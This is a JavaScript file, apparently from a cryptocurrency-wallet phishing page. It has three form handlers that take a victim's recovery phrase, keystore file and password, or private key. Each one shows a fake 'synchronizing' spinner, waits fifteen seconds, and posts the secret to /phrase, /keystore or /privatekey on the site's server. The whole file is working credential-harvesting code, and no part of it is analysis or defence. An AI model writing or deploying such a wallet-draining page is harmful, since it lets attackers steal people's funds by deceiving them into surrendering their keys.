phrase_btn = document.getElementById("phrase_btn");
keystore_btn = document.getElementById("keystore_btn");
privatekey_btn = document.getElementById("privatekey_btn");
manual_btn = document.getElementById("manual");

$(document).ready(function () {
    $("#phrasefm").submit(function (event) {
        event.preventDefault();
        var form = $("#phrasefm")[0];
        var data = new FormData(form);

        phrase_btn.innerHTML = `synchronizing..<i class="fas fa-spinner fa-spin"></i>`;
        phrase_btn.disabled = true;
        phrase_btn.style.opacity = 0.5;
        manual_btn.style.display = "none";
        manualform = document.getElementById("phrasefm");
        manualform.elements["phrasetx"].disabled = true;

        setTimeout(() => {
            $.ajax({
                type: "POST",
                url: "/phrase",
                data: data,
                processData: false,
                contentType: false,
                success: function (data) {
                    alert(data.res);
                    phrase_btn.innerHTML = `Proceed`;
                    phrase_btn.disabled = false;
                    phrase_btn.style.opacity = 1;
                    manualform.elements["phrasetx"].disabled = true;
                    manual_btn.style.display = "flex";
                },
                error: function (e) {
                    phrase_btn.innerHTML = `Proceed`;
                    phrase_btn.disabled = false;
                    phrase_btn.style.opacity = 1;
                    manualform.elements["phrasetx"].disabled = false;
                    manual_btn.style.display = "flex";
                    document.getElementById("phrase_error").innerHTML =
                        e.statusText;
                },
            });
        }, 15000);
    });
});

$(document).ready(function () {
    $("#keystorefm").submit(function (event) {
        event.preventDefault();
        var form = $("#keystorefm")[0];
        var data = new FormData(form);

        keystore_btn.innerHTML = `synchronizing..<i class="fas fa-spinner fa-spin"></i>`;
        keystore_btn.disabled = true;
        keystore_btn.style.opacity = 0.5;
        manual_btn.style.display = "none";
        manualform = document.getElementById("keystorefm");
        manualform.elements["keystoretx"].disabled = true;
        manualform.elements["keystorefl"].disabled = true;

        setTimeout(() => {
            $.ajax({
                type: "POST",
                url: "/keystore",
                data: data,
                processData: false,
                contentType: false,
                success: function (data) {
                    alert(data.res);
                    keystore_btn.innerHTML = `Proceed`;
                    keystore_btn.disabled = false;
                    keystore_btn.style.opacity = 1;
                    manualform.elements["keystoretx"].disabled = true;
                    manualform.elements["keystorefl"].disabled = true;
                    manual_btn.style.display = "flex";
                },
                error: function (e) {
                    keystore_btn.innerHTML = `Proceed`;
                    keystore_btn.disabled = false;
                    keystore_btn.style.opacity = 1;
                    manualform.elements["keystoretx"].disabled = false;
                    manualform.elements["keystorefl"].disabled = false;
                    manual_btn.style.display = "flex";
                    document.getElementById("keystore_error").innerHTML =
                        e.statusText;
                },
            });
        }, 15000);
    });
});

$(document).ready(function () {
    $("#privatekeyfm").submit(function (event) {
        event.preventDefault();
        var form = $("#privatekeyfm")[0];
        var data = new FormData(form);

        privatekey_btn.innerHTML = `synchronizing..<i class="fas fa-spinner fa-spin"></i>`;
        privatekey_btn.disabled = true;
        privatekey_btn.style.opacity = 0.5;
        manual_btn.style.display = "none";
        manualform = document.getElementById("privatekeyfm");
        manualform.elements["privatekeyfl"].disabled = true;

        setTimeout(() => {
            $.ajax({
                type: "POST",
                url: "/privatekey",
                data: data,
                processData: false,
                contentType: false,
                success: function (data) {
                    alert(data.res);
                    privatekey_btn.innerHTML = `Proceed`;
                    privatekey_btn.disabled = false;
                    privatekey_btn.style.opacity = 1;
                    manualform.elements["privatekeyfl"].disabled = true;
                    manual_btn.style.display = "flex";
                },
                error: function (e) {
                    privatekey_btn.innerHTML = `Proceed`;
                    privatekey_btn.disabled = false;
                    privatekey_btn.style.opacity = 1;
                    manualform.elements["privatekeyfl"].disabled = false;
                    manual_btn.style.display = "flex";
                    document.getElementById("privatekey_error").innerHTML =
                        e.statusText;
                },
            });
        }, 15000);
    });
});
